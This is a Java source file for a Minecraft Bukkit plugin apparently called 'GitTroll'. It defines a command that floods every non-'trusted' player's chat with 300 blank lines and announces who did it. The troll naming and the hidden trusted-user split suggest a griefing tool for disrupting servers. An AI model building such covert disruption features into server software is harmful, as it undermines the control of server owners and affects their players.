package net.Lenni0451.GitTroll.command.commands.server;

import java.util.List;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

import net.Lenni0451.GitTroll.command.CommandBase;
import net.Lenni0451.GitTroll.utils.ArrayHelper;
import net.Lenni0451.GitTroll.utils.CustomPlayer;
import net.Lenni0451.GitTroll.utils.Logger;

public class ClearChat extends CommandBase {

	public ClearChat() {
		super("ClearChat", "Clear the server chat");
	}

	@Override
	public void execute(CustomPlayer executor, ArrayHelper args) {
		if(args.isEmpty()) {
			for(Player player : Bukkit.getOnlinePlayers()) {
				CustomPlayer customPlayer = CustomPlayer.instanceOf(player);
				if(!customPlayer.isTrusted()) {
					for(int i = 0; i < 300; i++)
						customPlayer.sendMessage("");
				}
			}
			
			Logger.broadcastGitMessage("The player §6" + executor.getPlayer().getName() + "§a cleared the chat.");
		} else {
			this.commandWrong();
		}
	}

	@Override
	public void tabComplete(List<String> tabComplete, ArrayHelper args) {}

}
